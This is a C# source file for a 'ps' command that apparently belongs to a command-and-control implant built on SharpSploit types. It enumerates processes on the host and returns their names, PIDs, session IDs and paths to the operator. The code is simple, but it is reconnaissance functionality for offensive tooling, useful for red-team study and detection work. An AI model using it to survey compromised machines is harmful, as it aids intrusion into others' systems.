using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ListProcessCommand : AgentCommand
    {
        public override string Name => "ps";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {


            var list = new List<ListProcessResult>();
            string filter = null;
            if (task.SplittedArgs.Length == 1)
            {
                filter = task.SplittedArgs[0];
            }

            var processes = Process.GetProcesses();
            if (!string.IsNullOrEmpty(filter))
                processes = processes.Where(p => p.ProcessName.ToLower().Contains(filter.ToLower())).ToArray();

            foreach (var process in processes)
            {
                var res = new ListProcessResult()
                {
                    Name = process.ProcessName,
                    Id = process.Id,
                    SessionId = process.SessionId,
                    ProcessPath = GetProcessPath(process),
                };

                list.Add(res);
            }

            var results = new SharpSploitResultList<ListProcessResult>();
            results.AddRange(list.OrderBy(f => f.Name).ThenBy(f => f.Name));
            result.Result = results.ToString();
        }

        private string GetProcessPath(Process proc)
        {
            try
            {
                return proc.MainModule.FileName;
            }
            catch
            {
                return "-";
            }
        }

        public sealed class ListProcessResult : SharpSploitResult
        {
            public string Name { get; set; }

            public int Id { get; set; }

            public int SessionId { get; set; }

            public string ProcessPath { get; set; }

            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(Name), Value = Name },
                new SharpSploitResultProperty { Name = "PID", Value = Id },
                new SharpSploitResultProperty { Name = nameof(SessionId), Value = SessionId },
                new SharpSploitResultProperty { Name = nameof(ProcessPath), Value = ProcessPath },
            };
        }
    }
}
